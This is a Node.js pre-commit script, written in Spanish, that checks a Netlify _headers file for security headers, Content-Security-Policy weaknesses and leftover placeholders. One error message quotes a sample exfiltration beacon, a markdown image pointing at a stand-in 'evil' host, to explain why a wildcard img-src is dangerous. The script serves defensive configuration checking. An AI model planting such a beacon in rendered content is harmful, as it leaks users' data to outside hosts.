#!/usr/bin/env node
/**
 * ¿La app se despacha con cabeceras de seguridad, y dicen algo?
 *
 * ## Qué verifica, y qué ⊥
 *
 * Esto lee **el archivo**, ⊥ el deploy. Netlify puede ignorar un `_headers` mal formado y este
 * chequeo diría verde igual ∴ ⊥ reemplaza al `curl -sI` contra el sitio publicado. Son dos niveles
 * distintos y **la distinción es el punto**: este corre en el pre-commit, sin red; el otro corre
 * una vez después de desplegar. 🔗 `README.md` de esta carpeta.
 *
 * ## Por qué falla ante un placeholder
 *
 * Un `connect-src` que todavía dice `[COMPLETAR-PROYECTO]` es **peor que ⊥ tener la cabecera**:
 * ⊥ deja pasar nada útil y **parece puesto**. Es la misma trampa del `+1-555-0123` que
 * `verificar-seo.mjs` ya caza en el structured data ∴ mismo tratamiento.
 */

import { existsSync } from "node:fs";
import { resolve } from "node:path";
import { leerHeaders, partirCSP } from "./headers.mjs";

const RAIZ = process.cwd();
const ARCHIVO = resolve(RAIZ, "public", "_headers");
const REDIRECTS = resolve(RAIZ, "public", "_redirects");

/** Cada una tapa un agujero de ESTA arquitectura. ⊥ es una lista genérica de internet. */
const OBLIGATORIAS = {
  "Content-Security-Policy":
    "sin esto un XSS en cualquier dependencia puede exfiltrar la sesión: vive en `localStorage` " +
    "y el token sale por un `fetch` a donde sea. Un `connect-src` acotado lo convierte en un " +
    "defacement en vez de un robo de cuenta",
  "Referrer-Policy":
    "las URLs de esta app llevan payload (`/invite/xyz?token=…`, `/share-target?text=…`). Sin " +
    "esto ese token viaja en el `Referer` a cualquier dominio externo que la página cargue",
  "X-Frame-Options":
    'clickjacking: con paneles detrás de login, un iframe sobre "confirmar" ⊥ es teórico',
  "X-Content-Type-Options": "barato y sin contra",
  "Strict-Transport-Security": "sin `preload`, que es difícil de revertir y aporta poco acá",
};

const problemas = [];
let verificadas = 0;

if (!existsSync(ARCHIVO)) {
  console.error(
    `\n✖ ⊥ existe \`public/_headers\`.\n\n` +
      `   La app se sirve sin una sola cabecera de seguridad.\n` +
      `   Copiá \`tools/headers/_headers\` a \`public/_headers\` y reemplazá el placeholder del\n` +
      `   \`connect-src\` por el ref de tu proyecto Supabase.\n`,
  );
  process.exit(1);
}

let secciones;
try {
  secciones = leerHeaders(ARCHIVO);
} catch (error) {
  console.error(`\n✖ \`public/_headers\` ⊥ se puede leer: ${error.message}\n`);
  process.exit(1);
}

const global = secciones["/*"];
if (!global) {
  problemas.push(
    "el archivo ⊥ tiene una sección `/*`. Netlify aplica cabeceras por ruta ∴ sin la regla global\n" +
      "     las cabeceras ⊥ cubren nada, y el archivo igual existe y parece configurado.",
  );
} else {
  for (const [cabecera, porQue] of Object.entries(OBLIGATORIAS)) {
    verificadas++;
    if (!global[cabecera]) problemas.push(`falta \`${cabecera}\` — ${porQue}`);
  }

  // El placeholder, en cualquier cabecera.
  for (const [cabecera, valor] of Object.entries(global)) {
    verificadas++;
    if (/\[COMPLETAR/i.test(valor)) {
      problemas.push(
        `\`${cabecera}\` todavía tiene un placeholder sin reemplazar:\n` +
          `     ${valor.slice(0, 120)}\n` +
          "     Un placeholder es PEOR que la cabecera ausente: ⊥ deja pasar nada útil y parece puesto.",
      );
    }
  }

  const csp = global["Content-Security-Policy"];
  if (csp) {
    const d = partirCSP(csp);

    verificadas++;
    if (!d["connect-src"]) {
      problemas.push(
        "la CSP ⊥ declara `connect-src`. Es **la** directiva que importa acá: sin ella, un XSS\n" +
          "     manda la sesión a donde quiera. Sin `connect-src` el resto de la CSP es decorado.",
      );
    } else if (d["connect-src"].includes("*")) {
      problemas.push(
        "`connect-src *` ⊥ restringe nada. Nombrá los orígenes que la app usa de verdad.",
      );
    }

    // `img-src` con `https:` comodin es un canal de EXFILTRACION, ⊥ un detalle de estilo: una
    // `<img>` a un host ajeno se carga sola al renderizar y `connect-src` ⊥ la frena (bloquea
    // `fetch`, ⊥ imagenes). Con un renderer de markdown que muestra contenido de terceros
    // —docs sincronizados de un repo, respuestas del LLM— eso alcanza para sacar datos.
    // 🔗 `docs/auditoria-seguridad-2026-09.md` §B4.
    verificadas++;
    const img = d["img-src"] ?? d["default-src"] ?? [];
    for (const comodin of ["https:", "http:", "*"]) {
      if (img.includes(comodin)) {
        problemas.push(
          `\`img-src\` permite \`${comodin}\`, que habilita cargar imagenes de CUALQUIER host.\n` +
            "     Eso es una baliza de exfiltracion: `![](https://evil/?d=...)` en cualquier\n" +
            "     contenido renderizado dispara un GET solo, sin clic, y `connect-src` ⊥ lo tapa.\n" +
            "     Nombra los origenes reales (el propio y el de Storage).",
        );
      }
    }

    verificadas++;
    const script = d["script-src"] ?? d["default-src"] ?? [];
    for (const veneno of ["'unsafe-inline'", "'unsafe-eval'"]) {
      if (script.includes(veneno)) {
        problemas.push(
          `\`script-src\` permite ${veneno}, que es justo lo que la CSP viene a impedir.\n` +
            "     Medido en este stack: Vite emite el bundle como `<script src=...>` externo ∴ ⊥\n" +
            "     hacen falta nonces ni hashes. Si algo pide inline, mirá QUÉ es antes de abrirlo.",
        );
      }
    }

    verificadas++;
    if (!d["frame-ancestors"]) {
      problemas.push(
        "`frame-ancestors` ausente. `X-Frame-Options` es su versión vieja y ⊥ cubre los casos\n" +
          "     que los navegadores modernos deciden por CSP.",
      );
    }
  }
}

// 💡 Gratis del mismo archivo: una SPA sin catch-all sirve 404 de Netlify en cualquier deep link.
// ⊥ es seguridad, y sale sin costo porque ya estamos leyendo `public/`.
verificadas++;
if (!existsSync(REDIRECTS)) {
  problemas.push(
    "⊥ existe `public/_redirects`. Es una SPA: sin un catch-all `/* /index.html 200`, **todo\n" +
      "     deep link da 404 de Netlify** — compartir un link a una nota lleva a una página de error.",
  );
}

if (verificadas === 0) {
  console.error("\n✖ ⊥ se verificó nada. El chequeo ⊥ puede salir 0 sin haber mirado.\n");
  process.exit(1);
}

if (problemas.length > 0) {
  console.error(
    `\n✖ \`public/_headers\` (${problemas.length} de ${verificadas} comprobaciones):\n`,
  );
  for (const p of problemas) console.error(`   • ${p}\n`);
  console.error(
    "   ⚠️ Esto lee el ARCHIVO, ⊥ el deploy. Después de publicar, una vez:\n" +
      '      curl -sI https://tu-sitio | grep -i "content-security\\|strict-transport"\n',
  );
  process.exit(1);
}

console.log(`✓ Headers OK — ${verificadas} comprobaciones sobre \`public/_headers\`.`);
